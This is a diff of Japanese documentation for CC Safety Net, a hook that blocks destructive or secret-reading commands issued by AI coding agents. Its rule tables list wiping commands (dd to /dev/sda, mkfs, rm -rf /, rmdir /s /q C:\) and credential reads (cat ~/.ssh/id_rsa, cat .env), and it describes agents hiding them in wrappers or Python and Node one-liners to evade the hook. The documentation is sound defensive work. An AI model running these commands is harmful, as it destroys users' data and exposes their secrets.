+| `dd if=/dev/zero of=/dev/sda`、`dd of=/dev/nvme0n1 if=/dev/zero` | ブロック | `dd.device-write` |
+| `dd if=/dev/sda of=./backup.img` | 許可 | |
+| `dd if=big.bin of=/dev/null bs=1M`、`of=/dev/zero`、`of=/dev/full` | 許可 | |
+| `dd ... of=/dev/nullx` など、それ以外の `/dev/` の対象 | ブロック | `dd.device-write` |
+| `mkfs.ext4 /dev/sda1`、`mkfs -t ext4 /dev/sdb`、`mke2fs -t ext4 /dev/sde`、`newfs_hfs /dev/disk2s1` | ブロック | `mkfs.device` |
+| `mkfs.ext4 disk.img`、`mke2fs disk.img`、`newfs_hfs disk.img` | 許可 | |
+| `diskutil eraseDisk APFS Untitled disk4` と、サブコマンド `eraseVolume`、`reformat`、`partitionDisk`、`zeroDisk`、`randomDisk`、`secureErase` | ブロック | `disk.erase` |
+| `diskutil list`、`diskutil info disk4` | 許可 | |
+| `wipefs -a /dev/sdb`、`wipefs --offset=0x438 /dev/sdb` | ブロック | `disk.erase` |
+| `wipefs /dev/sdb`（シグネチャを表示するだけ） | 許可 | |
+| `sgdisk -Z /dev/sdc`、`sgdisk --zap-all /dev/sdd`、`sgdisk -n 1:0:0 /dev/sdd` | ブロック | `disk.erase` |
+| `sgdisk -p /dev/sda`、`sgdisk --print -v /dev/sda` | 許可 | |
+| `parted /dev/sde mklabel gpt`、`parted -s /dev/sdf rm 3`、および `mktable`、`mkpart`、`resizepart` | ブロック | `disk.erase` |
+| `parted /dev/sda print`、`parted -l` | 許可 | |
+| `wipefs -a disk.img`、`sgdisk -Z disk.img`、`parted disk.img mklabel gpt` | 許可 | |
+| `echo x > /dev/sda`、`printf x >> /dev/disk4`、`echo x &> /dev/sdb` | ブロック | `redirect.block-device` |
+| `echo x > /dev/null`、`echo x > /dev/tty`、`cat < /dev/sda > disk.img` | 許可 | |
+| `shred -u secret.txt`、`shred --help`、`shred --version` | ブロック | `shred.target` |
 
-リダイレクトのルールは、出力先をディスクデバイスの名前の一覧と照合します。対象は `/dev/disk4` と `/dev/rdisk4`、`/dev/sda`、`/dev/hda`、`/dev/vda`、`/dev/xvda`、`/dev/nvme0n1`、`/dev/mmcblk0`、`/dev/md0`、`/dev/dm-0`、`/dev/loop0`、`/dev/mapper/` 配下、`/dev/disk/` 配下です。この一覧に当てはまらない `/dev/null` や `/dev/tty` などの `/dev/` パスは、通常のリダイレクト先として扱います。
-
-`dd` のルールが働くのは、デバイスへの*書き込み*だけです。デバイスからファイルへの読み出し（`dd if=/dev/sda of=./backup.img`）や、ファイルとして存在するイメージに対する `mkfs.ext4 disk.img` は許可します。これらのルールは、ラッパーや他のコマンド経由の実行にも適用されます。`bash -c "dd if=/dev/zero of=/dev/sda"`、`sudo mkfs.ext4 /dev/sda`、`env dd of=/dev/sda if=/dev/zero`、`nice wipefs -a /dev/sdb`、`timeout 5 sgdisk -Z /dev/sdc`、`sh -c "echo x > /dev/sda"`、`eval "shred secret"` は、いずれもブロックされます。
-
-`/dev/null`、`/dev/zero`、`/dev/full` への `dd` の書き込みは何も壊さないため許可します。読み取り速度を測る `dd if=big.bin of=/dev/null bs=1M` はそのまま実行できます。それ以外の `/dev/` の対象は引き続きブロックし、`of=/dev/nullx` のような紛らわしい名前も対象です。この除外が効くのは、解析できたコマンドの `dd` ルールだけです。解析できないテキストでは、ヒューリスティックなスキャンが `dd of=/dev/null` に一致して `raw-text.dangerous-command` で拒否します。
+リダイレクトのルールが対象とするのは、`/dev/sda`、`/dev/disk4`、`/dev/nvme0n1`、`/dev/mapper/` 配下などのディスクデバイスです。それ以外の `/dev/` のパスは通常のリダイレクト先として扱います。これらのルールはラッパーの中にも適用されるため、`sudo mkfs.ext4 /dev/sda` も `bash -c "dd if=/dev/zero of=/dev/sda"` もブロックされます。検査対象外のディスクツールは[既知の制限](/ja/guides/known-limitations#disk-tool-coverage-is-a-named-list)にあります。
 
 <span id="git-metadata"></span>
 
 ## Git メタデータ
 
-最も近い祖先 `.git` エントリを解決する対象は、実行ディレクトリと、プロジェクトのルール設定を決める設定ディレクトリの 2 つです。それぞれについて、そのエントリ、解決後の Git ディレクトリ、`hooks` サブツリーを保護します。両者は通常同じディレクトリですが、エージェントがプロジェクトの外でコマンドを実行する場合（Amp の `shell_command.dir` や OpenCode の `workdir`）は異なります。そのときは両方の Git 管理領域を保護します。この確認は設定読み込み前に実行するため、無効化できません。
+CC Safety Net は、リポジトリの `.git` エントリ、それが指す Git ディレクトリ、その `hooks` ディレクトリを、すべての安全レベルで保護します。作業ディレクトリの中でも同じです。どの設定でも無効にできません。読み取り専用のツールや、`cat .git/config` のようなコマンドは許可されます。
 
-| ブロックする形式 | 説明 |
-| --- | --- |
-| `rm .git`, `rm -rf .git`, `rm .*` | Git 制御エントリを直接削除する |
-| `rm -rf <resolved gitDir>`、`rm -rf <commonDir>` | リンクされたワークツリーや submodule では `.git` が参照用のファイルになるため、その参照先の `gitDir` と `commonDir` も保護する |
-| `rm -rf <root>/.git/modules/<submodule>` | submodule の Git ディレクトリを保護する |
-| `rm -rf <dirname(gitDir)>/*` | 保護対象のディレクトリを含む glob |
-| 保護対象を移動元または移動先にする `mv` | 移動による回避を防ぐ |
-| `> .git` などの書き込みリダイレクト | 上書きをブロックする |
-| `.git/hooks/new-hook` への `Write` や patch | 書き込み、patch、未知のツール経由の操作から保護する |
-| `find .git -delete` | 常に重大な操作として扱う |
-| リポジトリルートでの `find . -exec rm {} +` | `-exec` や `-execdir` が `{}` を `rm` や `rmdir` に渡す場合、`find` が返したパスの削除として扱う。`rm` や `rmdir` を実行するシェルの `-c` の本体に `{}` を渡す場合も同様 |
+| コマンド | 結果 | ID |
+| --- | --- | --- |
+| `rm .git`、`rm -rf .git`、`rm -r .*` | 致命的 | `rm.git-metadata` |
+| リンクされたワークツリーやサブモジュールの `rm -rf <gitDir>` または `rm -rf <commonDir>` | 致命的 | `rm.git-metadata` |
+| `mv .git backup` | ブロック | `guard.git-metadata` |
+| `.git/hooks/new-hook` を対象とする `Write` やパッチのツール呼び出し | ブロック | `guard.git-metadata` |
+| リポジトリルートでの `find . -exec rm {} +` | 致命的 | `find.delete-git-metadata` |
+| リポジトリルートでの `find . -name HEAD -exec rm {} +` | 致命的 | `find.delete-git-metadata` |
+| リポジトリルートでの `find . -name '*.pyc' -exec rm {} +` | 許可 | |
 
-リテラルの `-name` または `-iname` のフィルターは、起点だけを理由にしたブロックを解除できます。CC Safety Net は、最初のアクションより前に集めたフィルターすべてに一致するエントリを保護対象のメタデータから探し、見つからなければ削除を許可します。そのため、リポジトリルートでも `find . -name '*.pyc' -exec rm {} +` は通ります。一方、`.git` に同じ名前のエントリがあるため、`find . -name '*.sample' -exec rm {} +` と `find . -name HEAD -exec rm {} +` は引き続きブロックされます。`find . -name '*.pyc' -delete` もブロックされますが、`find.delete-git-metadata` ではなく `find.delete` によるものです。この例外の範囲は狭く、メタデータのルートがシンボリックリンクの場合、ディレクトリを読み取れない場合、エントリ数が 50,000 を超えた場合はフェイルクローズでブロックを維持します。ブロックが残る形式の一覧は[解析エンジン](/ja/guides/analysis-engine)にあります。
-
-シンボリックリンクになっている `.git` ディレクトリとフックディレクトリは、表記上のパスと正規化後のパスの**どちらでも**保護します。存在しない Git ディレクトリを指す `.git` の参照ファイルもブロックします。POSIX シェルの末尾の `*` glob はドットで始まるエントリに一致しないため、リポジトリルートでの `rm -rf ./*` は `.git` を対象にしません。ただし、`rm -rf .git/worktrees/*` と PowerShell のワイルドカードは対象になります。
+`-name` や `-iname` のフィルターでブロックが解除されるのは、`.git` 内にそのフィルターに一致するエントリがない場合だけです。`.git` には `HEAD` という名前のファイルがあるため、その行は引き続きブロックされます。
 
 <Note>
-  範囲の目安：このガードが対象とするのは、実行ディレクトリと設定ディレクトリから見て、それぞれ最も近い上位の Git 管理領域です。どちらかのディレクトリの下に入れ子になった別のリポジトリや、解決された対象に含まれない Git 内部のパスは対象外です。
+  このガードが対象とするのは、作業ディレクトリから見て最も近い上位のリポジトリと、プロジェクト設定を含むディレクトリから見て最も近い上位のリポジトリです。その下に入れ子になった別のリポジトリは対象外です。
 </Note>
 
-## 保護対象の `policy.json`
+<span id="protected-policy-json-files"></span>
 
-保護対象のポリシーファイルを変更・削除する操作は、常にブロックします。保護対象は 2 つです。1 つはユーザーポリシーのファイル（`~/.cc-safety-net/policy.json`、または変数が設定されている場合は `$CC_SAFETY_NET_HOME/policy.json`）、もう 1 つは実行ディレクトリと設定ディレクトリのそれぞれから解決したプロジェクトポリシーのファイル（`.cc-safety-net/policy.json`）です。このチェックには設定の値が一切入らないため、保護対象のポリシー側から無効にすることはできません。この拒否には安全レベルも設定の状態も付きません。理由の文字列は次のとおりです。
+## 保護対象の policy.json ファイル
+
+保護対象のポリシーファイルを変更または削除する操作は、固定の ID `guard.policy-config` で常にブロックされます。保護対象のファイルは 2 つです。1 つはユーザーファイルの `~/.cc-safety-net/policy.json`（`CC_SAFETY_NET_HOME` が設定されている場合は `$CC_SAFETY_NET_HOME/policy.json`）、もう 1 つはプロジェクトファイルの `.cc-safety-net/policy.json` です。ポリシーでこのチェックを無効にすることはできません。理由の文字列は次のとおりです。
 
 ```text
 This path contains the protected policy config and you must not modify or delete it.
 ```
 
-照合の対象は 2 つのファイルと、スコープごとに異なるディレクトリの集合です。ユーザーポリシーのファイルでは、そのディレクトリとすべての上位ディレクトリが対象になります。プロジェクトポリシーのファイルでは、自身の `.cc-safety-net` ディレクトリまでで、それより上は対象外です。そのため、プロジェクトルートでの `rm -rf .` は、このガードではなく破壊的コマンドのルール本来の理由を返します。形式は次のとおりです。
+どちらかのファイルやそのディレクトリに対する書き込み、編集、パッチ、リダイレクト、`mv`、再帰削除はブロックされます。`cat`、`grep`、`jq`、`less`、`ls`、`stat` などの読み取り専用のコマンドは通ります。このように保護されるのは `policy.json` だけで、`rule.json` とルールブックは対象外です。
 
-- 直接の書き込み、編集、patch の対象。
-- シェルのオペランドとしての完全一致、および書き込みリダイレクト。
-- 対応する環境変数による指定、相対パス、既存のシンボリックリンク経由の別名。
-- 保護対象のディレクトリに対する再帰的な `rm`。
-- 保護対象のファイルまたはディレクトリを移動元とする `mv`。
-
-読み取り専用の `[`, `cat`, `file`, `grep`, `head`, `jq`, `less`, `ls`, `more`, `rg`, `sed`, `stat`, `tail`, `test`, `wc` は許可します。
-
-<Warning>
-  これは意図的に最小限にとどめた、パス完全一致のガードであり、コマンドの動作を模倣するものではありません。代入のみのシェル変数と明示的な `cd` は追跡しますが、glob やブレース展開は行わず、計算されたインタープリターのパスを推測せず、インタープリターの本体も検査せず、アーカイブの中身も推測せず、`find` のアクションを模倣せず、転送後の最終的なファイル名も推測しません。`cd` の追跡はシェルのスコープに従います。サブシェル、コマンド置換、プロセス置換の中の `cd` は、そのシェルが終わるまでしか効きません。brace group や呼び出された関数本体の中の `cd` は、コマンドの残りの部分にも効きます。`cd -` は直前の `cd` を実行する前のディレクトリに戻ります。`rule.json`、ルールブック、同じディレクトリ内の他のファイル、ポリシーディレクトリの一覧取得は、このガードの対象外です。改ざんに耐えるのは `policy.json` だけで、これは両方のスコープで保護されます。
-</Warning>
+<span id="agent-run-cc-safety-net-policy-apply"></span>
 
 ### エージェントによる `cc-safety-net policy apply`
 
-`policy apply` はこのガードが保護するファイルを書き換えるため、同じ段階が設定を読み込む前に、`hard_stop` の intent で拒否します。提案を適用できるのはユーザーだけで、これを解除するフラグはありません。理由の文字列は次のとおりです。
+エージェントは `cc-safety-net policy apply` を実行できません。`npx` などのランナー経由でも同じです。CC Safety Net は固定の ID `guard.policy-apply` でこれを拒否し、解除するフラグはありません。`policy check` は引き続き許可されます。理由の文字列は次のとおりです。
 
 ```text
 Only the user may apply a policy proposal, because it rewrites the configuration CC Safety Net enforces. Ask them to run `cc-safety-net policy apply <file>` themselves in a terminal; you can run `cc-safety-net policy check <file>` to show them what it would change.
 ```
 
-この判定は意図的に広めに一致します。対象は、`cc-safety-net` と `ccsn` の直接実行、`npx`、`bunx`、`pnpx`、`pnpm dlx`、`yarn dlx`、`npm exec`、`pnpm exec`、`yarn exec`、`cc-safety-net@latest` のようなバージョン指定、`bun` と `node` による `src/cli/cc-safety-net.ts` または `dist/bin/cc-safety-net.js` の実行です。実行対象の前にランナーのオプションを置いても回避できず、`-g` と `--global` は位置に関係なく読み飛ばされます。`policy check` とその他のサブコマンドは許可されたままです。
+<span id="powershell-commands"></span>
 
-## PowerShell `Remove-Item`
+## PowerShell コマンド
 
-PowerShell への対応は限定的なサブセットです。対象は、`Remove-Item` とその別名、ファイル系コマンドレットの `Get-Content`、`Set-Content`、`Add-Content`、`Copy-Item`、`Move-Item` と別名 `gc`、`cat`、`type`、`cp`、`mv`、および既存のシェル共通ルールです。汎用の PowerShell パーサーではありません。以下の削除ルールは `powershell` と `auto` のシェルモードで適用されます。`posix` モードでは意図的に適用しませんが、`git.reset-hard` や `rm.recursive-force-root-or-home` のようなシェル共通のルールは引き続き適用されます。例外は `powershell -Command` または `pwsh -Command` に入れ子で渡したスクリプトで、どのシェルモードでも PowerShell として解析します。[入れ子の PowerShell スクリプト](#nested-powershell-scripts)を参照してください。機密パスの保護は、`$HOME`、`$env:USERPROFILE`、`$env:HOME`、`~` のいずれかの先頭部分に、どちらのパス区切りでリテラルの末尾部分を連結した形式を解決します。そのため `Get-Content $HOME\.ssh\id_rsa` はブロックされます。それ以外の方法で組み立てたパス、たとえば文字列連結、部分式、`Join-Path` を使ったものは評価しません。
+`Remove-Item` のルールは、シェルモードが `powershell` または `auto` のときに適用されます。`posix` モードで適用されるのは、`git.reset-hard` のようなシェル共通のルールだけです。別名や省略したパラメーターも解決するため、`ri . -r -fo` もブロックされます。
 
-| コマンド形式 | ブロックする理由 | レベル |
+| コマンド | 結果 | ルール ID |
 | --- | --- | --- |
-| `Remove-Item C:\`、`~`、`$HOME`、`${HOME}`、`$env:USERPROFILE`、`$env:HOME` | 末尾に `\`、`\*`、`/` が付く形式を含む、root またはホームディレクトリの削除 | すべて、致命的 |
-| `Remove-Item .git -Recurse -Force` | Git メタデータを削除する | すべて、重大 |
-| `Remove-Item . -Recurse -Force` | パラメーター終端の `--` の後に書かれた場合も含む、カレントディレクトリそのもの | すべて |
-| `Remove-Item ../other -Recurse -Force` | `..\other`、`../{other}`、外側の要素を含むカンマ区切りの配列、Windows の UNC／名前空間パスなど、カレントディレクトリの外 | すべて |
-| `Set-Location $HOME; Remove-Item ./build -Recurse -Force` | カレントディレクトリがホームの状態での再帰削除 | すべて |
-| `Remove-Item $target -Recurse -Force` | 動的な対象を検証できない | **strict**、paranoid |
-| `Get-ChildItem . -Recurse \| Remove-Item -Force` | パイプラインからの入力を検証できない | **strict**、paranoid |
-| `Remove-Item -Recurse -Force -Path` | `-Path` の値がない場合は動的な対象として分類する | **strict**、paranoid |
-| `Remove-Item @params -Recurse -Force` | スプラッティングのパラメーターは動的な対象として分類する | **strict**、paranoid |
-| `Remove-Item ./cache -Recurse -Force` | カレントディレクトリ配下の、一時パス以外 | **paranoid**（[`CC_SAFETY_NET_PARANOID_RM=1`](/ja/configuration/modes#paranoid-rm-check)） |
+| `Remove-Item C:\`、`Remove-Item ~`、`$HOME`、`$env:USERPROFILE` | 致命的 | `powershell.remove-item-root-or-home` |
+| `Remove-Item C:\ -Recurse -Force`、`Remove-Item $HOME -Recurse -Force` | 致命的 | `powershell.remove-item-recursive-force-root-or-home` |
+| `Remove-Item .git -Recurse -Force` | 致命的 | `powershell.remove-item-git-metadata` |
+| `Remove-Item . -Recurse -Force` | ブロック | `powershell.remove-item-recursive-force-cwd-self` |
+| `Remove-Item ../outside -Recurse -Force` | ブロック | `powershell.remove-item-recursive-force-outside-cwd` |
+| `Set-Location $HOME; Remove-Item ./build -Recurse -Force` | ブロック | `powershell.remove-item-recursive-force-home-cwd` |
+| `Remove-Item $target -Recurse -Force`、`Remove-Item @params -Recurse -Force` | Strict | `powershell.remove-item-recursive-force-dynamic-target` |
+| `Get-ChildItem . -Recurse \| Remove-Item -Force` | Strict | `powershell.remove-item-pipeline-dynamic-target` |
+| `Remove-Item ./cache -Recurse -Force` | Paranoid rm | `powershell.remove-item-recursive-force-paranoid` |
+| `Remove-Item /tmp/test-dir -Recurse -Force` | 許可 | |
+| `Remove-Item file.txt` | 許可 | |
+| `Remove-Item . -Recurse -Force -WhatIf` | 許可 | |
 
-別名と省略されたパラメーターも解決するため、`ri . -r -fo` もブロックします。呼び出し演算子を使った形式（`& Remove-Item ...`、`& { ... }`、`. { ... }`）、リテラル文字列を渡す `iex` / `Invoke-Expression`、`$(...)` の部分式も解析します。行コメント（`#`）とブロックコメント（入れ子を含む `<# ... #>`）は無視しますが、その後ろにある実際のコマンドは引き続きブロックします。形式が不正なブロックコメントや部分式、深さの上限を超えたものはフェイルクローズになります。
-
-<Note>
-  `-WhatIf` を付けた場合、PowerShell は実際には何も削除しないため、ブロックの対象から外れます。`-WhatIf`、`-WhatIf:$true`、省略形の `-wi` を付ければ、通常はブロックされる `Remove-Item . -Recurse -Force` も許可されます。明示的に `-WhatIf:$false` を指定した場合は、再びブロックされます。なお、上の strict 限定の行には例外が 1 つあります。`Remove-Item $HOME -Recurse -Force` は動的な対象ではなく root／ホームの対象として分類されるため、**standard でも**ブロックされます。
-
-  PowerShell の変数名は大文字と小文字を区別しないため、上の root／ホームの行にあるホームの変数も同じように区別せずに照合します。`Remove-Item -Recurse -Force $home`、`$Home\*`、`${home}` はいずれも、動的な対象ではなく root／ホームの対象として分類されます。スクリプトの手前で代入していても、この分類は変わりません。PowerShell の `$HOME` は読み取り専用なので、`$home = 'D:\temp'; Remove-Item -Recurse -Force $home` は結局ホームを削除することになり、このルールは引き続きブロックします。
-</Note>
-
-<span id="sensitive-paths"></span>
-
-## 機密パス
-
-機密パスの保護は、コマンド解析より前に実行される別のガードステージです。対応する **コマンド**、**パス**、**検索**（grep／glob）、**patch** の各形式に適用され、未知のツールについても、その任意のテキストをシェルコマンドとして扱うことなく検査します。
-
-書き込みだけでなく、組み込みの機密ファイル群の読み取りもブロックします。`cat .env`、`env cat .env`、`sudo command cat .env`、`strings id_rsa`、`xxd .env`、`base64 .env`、`dd if=.env`、`cat ~/.ssh/id_rsa`、`bash -c "cat .env"`、`pwsh -c 'Get-Content ~/.ssh/config'`、`node -e 'require("child_process").execSync("cat .env")'` は、いずれもブロックされます。
-
-コマンドの形の抽出は、上限を設けたうえで構造的に行います。シェル構文の構造的な上限を超えた場合はフェイルクローズになり、パースが不正な場合は例外になります。設定済みの拒否パスは組み込みルールより先に照合され、standard モードの緩和によって外れることはありません。
-
-すべてのルール ID とその分類、保護対象のパス、Coding CLI の 2 つの階層、照合の順序、除外条件は、[シークレット保護リファレンス](/ja/reference/secret-protection)を参照してください。機能全体は `secret_protection.enabled: false` で無効にでき、個別のルールは `secret_protection.overrides` で有効・無効を切り替えられます。[ポリシー](/ja/configuration/policy#secret-protection)を参照してください。
+`-WhatIf`、`-WhatIf:$true`、`-wi` を付けた `Remove-Item` はドライランになるため、ブロックされません。`-WhatIf:$false` を指定すると再びブロックされます。PowerShell のワイルドカードはドットで始まるエントリにも一致するため、ワイルドカードが `.git` に及ぶことがあります。
 
 <span id="shell-wrappers-and-interpreter-one-liners"></span>
 
-## シェルラッパーとインタープリターの 1 行コード
+## シェルラッパーとインタープリターのワンライナー
 
-`bash -c` や `sh -c` のようなシェルのインタープリターで包まれたコマンドもブロックします。入れ子になったラッパーは最大 10 階層まで再帰的に解析し、その深さを超えるコマンドは通さずに拒否します。
+CC Safety Net は、`bash -c`、`sh -c`、`sudo`、`env` などのラッパーの中のコマンドを、最大 10 階層まで検査します。それより深く入れ子になったコマンドは拒否します。[カスタムルール](/ja/configuration/custom-rules)も、すべての階層に適用されます。
 
-| 例 | 結果 |
-| --- | --- |
-| `bash -c 'git reset --hard'` | ブロック |
-| `sh -lc 'rm -rf /'` | ブロック |
+| コマンド | 結果 | ルール ID |
+| --- | --- | --- |
+| `bash -c 'git reset --hard'` | ブロック | `git.reset-hard` |
+| `sh -lc 'rm -rf /'` | 致命的 | `rm.recursive-force-root-or-home` |
+| `/usr/bin/env git reset --hard` | ブロック | `git.reset-hard` |
+| `python -c 'import os; os.system("rm -rf /")'` | ブロック | `interpreter.dangerous-command` |
+| `node -e 'require("child_process").exec("git reset --hard")'` | ブロック | `interpreter.dangerous-command` |
+| `python -c "print(1)"` | 許可 | |
+| `bash -c "$CMD"` | ブロック | `analysis.dynamic-shell-source` |
+| `$(printf r)m -rf /`、`c=rm; "$c" -rf dir` | Standard のみ | `shell.dynamic-executable` |
+| `git reset $(printf --hard)` | Standard のみ | `shell.dynamic-structure` |
+| `W='rm -rf ~'; echo "$W"` | Standard のみ | `raw-text.dangerous-command` |
 
-シェルの `-c` の本体は、リテラルの位置パラメーターを束縛したうえで解析します。そのため `sh -c 'rm -rf "$1"' _ /` は `rm.recursive-force-root-or-home` で、`sh -c 'rm -rf "$1"/.git' _ .` は `rm.git-metadata` でブロックされます。リテラルでない引数が 1 つでもあれば、本体は書かれたままになります。束縛の条件は[解析エンジン](/ja/guides/analysis-engine)を参照してください。
-
-`sudo`、`env`、`command`、`builtin` のラッパーは basename で照合するため、フルパスの表記もコマンド名だけの表記と同じように取り除かれます。`/usr/bin/env git reset --hard`、`sudo /usr/bin/env git reset --hard`、`/usr/bin/env rm -rf ../outside` はいずれもブロックされます。`/usr/bin/env -- git status` は、`git status` が許可されるため許可されたままです。
-
-[カスタムルール](/ja/configuration/custom-rules)もすべての深さで適用されます。そのため、`rm` や `git` を対象にしたルールは `bash -c`、`sh -c`、`eval`、呼び出された関数の本体の中にも及びます。
-
-インタープリターの 1 行コードに埋め込まれた破壊的なコードは、**既定で**検出してブロックします。CC Safety Net は、インタープリターの `-c` や `-e` フラグに渡されたコードを取り出し、埋め込まれた破壊的操作をスキャンします。そのため、エージェントが Python や Node の呼び出しに `os.system("rm -rf /")` を紛れ込ませても、フックはすり抜けられません。
-
-| 例 | 結果 |
-| --- | --- |
-| `python -c 'import os; os.system("rm -rf /")'` | 既定でブロック（埋め込まれた `rm -rf` を検出） |
-| `node -e 'require("child_process").exec("git reset --hard")'` | 既定でブロック |
-
-解析対象のインタープリターは、`python`、`python2`、`python3`、`node`、`ruby`、`perl` です。ブロックの原因になるのは埋め込まれた破壊的コマンドであり、1 行コードという形式そのものは既定では許可されます。
-
-<span id="command-prompt-bodies"></span>
+この方法で検査するインタープリターは、`python`、`python2`、`python3`、`node`、`ruby`、`perl` です。`python -c "print(1)"` も含めてインタープリターのワンライナーをすべてブロックするには、[paranoid のインタープリターチェック](/ja/configuration/modes#interpreter-one-liners-cc_safety_net_paranoid_interpreters=1)を有効にします。そのブロックには `interpreter.one-liner-paranoid` が付きます。
 
 ### コマンドプロンプトの本体
 
-CC Safety Net は、どのシェルモードでも `cmd /c` と `cmd /k` の本体を読み取ります。先頭のコマンドは `cmd` でも `cmd.exe` でもよく、大文字と小文字は区別しません。Git Bash で使う `//c` という書き方も対象です。この読み取りは限定的なテキスト検査であり、cmd のパーサーではありません。外側の引用符を 1 組外してから、本体を `&` と `|` で分割します。分割した各部分では、`/s` スイッチ付きの `rmdir`、`rd`、`del`、`erase` を探します。`/s/q` のようにまとめたスイッチ、先頭の `@`、`if exist` による条件の後ろにある場合も対象です。見つけた削除の対象は、外側の作業ディレクトリを基準に `cmd.recursive-delete-*` のルールで判定します。パスの最後の `*.*` は `*` として扱います。それ以外の部分は外側のシェルのコマンドとして解析するため、`cmd /c git reset --hard` は `git.reset-hard` でブロックされます。
+CC Safety Net は、どのシェルモードでも `cmd /c` と `cmd /k` の本体を読み取ります。`/s` を付けた `rmdir`、`rd`、`del`、`erase` を検査し、本体のそれ以外の部分は通常のコマンドとして検査します。そのため `cmd /c git reset --hard` は `git.reset-hard` でブロックされます。
 
-| 例 | 結果 |
-| --- | --- |
-| `cmd /c 'rmdir /s /q C:\'`、`cmd /c "del /s /q C:\*.*"` | `cmd.recursive-delete-root-or-home` でブロック |
-| `cmd /c 'if exist C:\ rmdir /s /q C:\'` | `cmd.recursive-delete-root-or-home` でブロック |
-| `cmd /c '@rd /s /q ..\outside'` | `cmd.recursive-delete-outside-cwd` でブロック |
-| `cmd /c "rmdir /s /q \"build output\""` | `cmd.recursive-delete-escaped-quote` でブロック |
-| `cmd /c 'cd /d C:\Users && rmdir /s /q build'` | 検証できないシェルの実行元として拒否 |
-| `cmd /c 'rd/s/q C:\'`、`cmd /c '(rmdir /s /q C:\)'` | 検証できないシェルの実行元として拒否 |
-| `cmd /c 'if exist node_modules rmdir /s /q node_modules'` | ワークスペース内なので許可 |
-| `cmd /c 'del /q build.log'` | 再帰削除ではないので許可 |
+| コマンド | 結果 | ルール ID |
+| --- | --- | --- |
+| `cmd /c 'rmdir /s /q C:\'`、`cmd /c "del /s /q C:\*.*"` | 致命的 | `cmd.recursive-delete-root-or-home` |
+| `cmd /c 'if exist C:\ rmdir /s /q C:\'` | 致命的 | `cmd.recursive-delete-root-or-home` |
+| `cmd /c rmdir /s /q .git` | 致命的 | `cmd.recursive-delete-git-metadata` |
+| `cmd /c "rmdir /s /q \"build output\""` | 致命的 | `cmd.recursive-delete-escaped-quote` |
+| `cmd /c rmdir /s /q .` | ブロック | `cmd.recursive-delete-cwd-self` |
+| `cmd /c '@rd /s /q ..\outside'` | ブロック | `cmd.recursive-delete-outside-cwd` |
+| `Set-Location $HOME; cmd /c rmdir /s /q build` | ブロック | `cmd.recursive-delete-home-cwd` |
+| `cmd /c del /s /q *.log` | Strict | `cmd.recursive-delete-dynamic-target` |
+| `cmd /c rmdir /s /q build` | Paranoid rm | `cmd.recursive-delete-paranoid` |
+| `cmd /c 'cd /d C:\Users && rmdir /s /q build'`、`cmd /c 'rd/s/q C:\'` | ブロック | `analysis.dynamic-shell-source` |
+| `cmd /c 'if exist node_modules rmdir /s /q node_modules'` | 許可 | |
+| `cmd /c 'del /q build.log'` | 許可 | |
 
-**エスケープした引用符。** cmd は `\"` をエスケープとして扱わないため、`\"` を使って書いた対象が分割され、ドライブのルートを指すことがあります。そのため、再帰削除の記述を含む本体は、次のいずれかに当てはまると、安全レベルや permission mode にかかわらず `cmd.recursive-delete-escaped-quote` でブロックされます。
+cmd は `\"` をエスケープとして扱わないため、引用符で囲んだ対象が分割され、ドライブのルートを指すことがあります。そのため、本体に `\"` を含む再帰削除は致命的として扱われます。ブロックメッセージは、パスを 1 つずつ引用符で囲んだ引数にするか、代わりに `Remove-Item -LiteralPath` を使うよう求めます。`^`、`%`、`!`、`cd`、引用符で囲んだ `&` や `|` を併用する再帰削除は、検証できない実行元として拒否します。
 
-- 本体に `\"` が含まれる場合。PowerShell では、コマンドのどの語に含まれる `\"` も対象です。
-- シェルモードが `posix` で、本体に `"` が 1 つでも含まれる場合。Git Bash は cmd を起動するときに、`"` をすべて `\"` にエスケープし直します。
-- 削除の対象が `\\?\` や `\\.\` の名前空間パスである場合。
-
-ブロックメッセージは、パスを 1 つずつ引用符で囲んだ引数として渡すか、代わりに `Remove-Item -LiteralPath` を使うよう求めます。
-
-**検証できない本体。** 対象に対するルールで先にブロックされなかった場合、再帰削除の記述を含む本体に次のいずれかが含まれていれば、理由 `shell execution source cannot be verified safely.` で拒否されます。
-
-- `^`、`%`、`!`。cmd がエスケープと変数展開に使う文字です。
-- `"` と、`&` または `|` の組み合わせ。分割は引用符を考慮しないため、引用符の中の `&` によって対象の一部が見落とされるおそれがあります。
-- `cd`、`chdir`、`pushd`、`popd` の語。位置は問わず、`cd..` や `cd\` のように続けて書いた形も含みます。
-- この読み取り処理が解析できない削除。`rd/s/q`、引用符で囲んだコマンド名、括弧で囲んだグループなどです。
-
-standard モードの Claude Code のフックでは、この拒否が権限確認のプロンプトになることがあります。条件はこのページ冒頭の注記のとおりです。対象に対する拒否が先に判定されるため、`cmd /c 'rmdir /s /q C:\ & echo %DATE%'` は引き続き `cmd.recursive-delete-root-or-home` でブロックされます。
-
-この読み取りはテキストの照合なので、何も削除しないコマンドをブロックすることもあります。`cmd /c 'echo rmdir /s /q C:\'` は、ドライブのルートの削除としてブロックされます。読み取りの対象外については[既知の制限](/ja/guides/known-limitations#windows-command-prompt-and-nested-powershell)を参照してください。
+この読み取りはテキストの照合なので、何も削除しない `cmd /c 'echo rmdir /s /q C:\'` もブロックされます。読み取りの対象外については[既知の制限](/ja/guides/known-limitations#windows-command-prompt-and-nested-powershell)を参照してください。
 
 <span id="nested-powershell-scripts"></span>
 
 ### 入れ子の PowerShell スクリプト
 
-CC Safety Net は、`powershell` と `pwsh` のコマンドを、大文字と小文字や `.exe` の有無にかかわらず、どのシェルモードでも読み取ります。ただし、読み取るのは次の形だけです。
+`powershell -Command '…'` や `pwsh -c '…'` のスクリプトは、どのシェルモードでも PowerShell として読み取ります。条件は、スクリプトがリテラルのテキストであり、`-Command` より前にあるのが `-NoProfile`、`-NonInteractive`、`-NoLogo`、`-ExecutionPolicy` だけであることです。それ以外の形で再帰削除を含むものは、致命的としてブロックします。
 
-1. `-NoProfile`（`-nop`）、`-NonInteractive`（`-noni`）、`-NoLogo`、値を 1 つ取る `-ExecutionPolicy`（`-ep`）が 0 個以上並ぶ。
-2. 続いて `-Command` または `-c` がある。
-3. その後に、すべてリテラルのスクリプトの語が続く。外側のシェルが展開するものと `--%` は含まない。
+| コマンド | 結果 | ルール ID |
+| --- | --- | --- |
+| `pwsh -NoProfile -c 'Remove-Item -Recurse -Force C:\'` | 致命的 | `powershell.remove-item-recursive-force-root-or-home` |
+| `powershell -NoProfile -ExecutionPolicy Bypass -Command 'Remove-Item -Recurse -Force C:\'` | 致命的 | `powershell.remove-item-recursive-force-root-or-home` |
